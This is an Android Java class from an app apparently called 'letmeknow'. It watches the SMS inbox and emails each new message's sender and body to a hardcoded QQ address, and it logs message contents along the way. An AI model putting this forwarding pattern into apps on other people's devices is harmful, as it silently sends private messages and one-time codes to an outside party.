package com.feifeier.letmeknow.managers;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.feifeier.letmeknow.models.mail.MailSender;
import com.feifeier.letmeknow.models.sms.SmsBean;

import javax.mail.MessagingException;

/**
 * Created by champion on 17/4/23.
 * Sms短信数据库观察者
 */

public class SmsObserver extends ContentObserver {

    private final static String TAG = "SmsObserver";

    private static final Uri MMSSMS_ALL_MESSAGE_URI = Uri.parse("content://sms/inbox");

    private static final String SORT_FIELD_STRING = "_id asc";  // 排序
    private static final String DB_FIELD_ID = "_id";
    private static final String DB_FIELD_ADDRESS = "address";
    private static final String DB_FIELD_PERSON = "person";
    private static final String DB_FIELD_BODY = "body";
    private static final String DB_FIELD_DATE = "date";
    private static final String DB_FIELD_TYPE = "type";
    private static final String DB_FIELD_THREAD_ID = "thread_id";

    public static final String[] ALL_DB_FIELD_NAME = {
            DB_FIELD_ID, DB_FIELD_ADDRESS, DB_FIELD_PERSON, DB_FIELD_BODY,
            DB_FIELD_DATE, DB_FIELD_TYPE, DB_FIELD_THREAD_ID};

    public static int mMessageCount = -1;

    private ContentResolver mResolver;


    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SmsObserver(ContentResolver resolver, Handler handler) {
        super(handler);

        this.mResolver = resolver;
    }

    @Override
    public void onChange(boolean selfChange) {
        Log.v(TAG, "短信内容有改变");
        Cursor cursor = null;
        try {
            cursor = mResolver.query(MMSSMS_ALL_MESSAGE_URI, ALL_DB_FIELD_NAME,
                    null, null, SORT_FIELD_STRING);
            final int count = cursor.getCount();
            if (count <= mMessageCount) {
                mMessageCount = count;
                return;
            }
            // 发现收件箱的短信总数目比之前大就认为是刚接收到新短信---如果出现意外，请神保佑
            // 同时认为id最大的那条记录为刚刚新加入的短信的id---这个大多数是这样的，发现不一样的情况的时候可能也要求神保佑了
            mMessageCount = count;
            if (cursor != null) {
                cursor.moveToLast();

                SmsBean smsBean = new SmsBean();
                smsBean.smsDate = Long.parseLong(cursor.getString(cursor.getColumnIndex(DB_FIELD_DATE)));
                smsBean.nowDate = System.currentTimeMillis();
                // 短信号码
                smsBean.smsAddress = cursor.getString(cursor.getColumnIndex(DB_FIELD_ADDRESS));
                // 短信信息
                smsBean.smsBody = cursor.getString(cursor.getColumnIndex(DB_FIELD_BODY));
                smsBean.id = cursor.getInt(cursor.getColumnIndex(DB_FIELD_ID));

                Log.v(TAG, "收到的新短息: " + smsBean.toString());

                sendEmail(smsBean);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                try {
                    // 有可能cursor都没有创建成功
                    cursor.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

    }

    private void sendEmail(final SmsBean smsBean) {
        Log.v(TAG, "sendEmail()");

        new Thread(new Runnable() {
            @Override
            public void run() {
                MailSender mailSender = new MailSender.Builder()
                        .toMailAddress("332560026@qq.com")
                        .build();
                try {
                    mailSender.send(smsBean.smsAddress,smsBean.toString());
                } catch (MessagingException e) {
                    Log.v(TAG, "发送邮件出错: " + e.getStackTrace());
                }
            }
        }).start();
    }

}
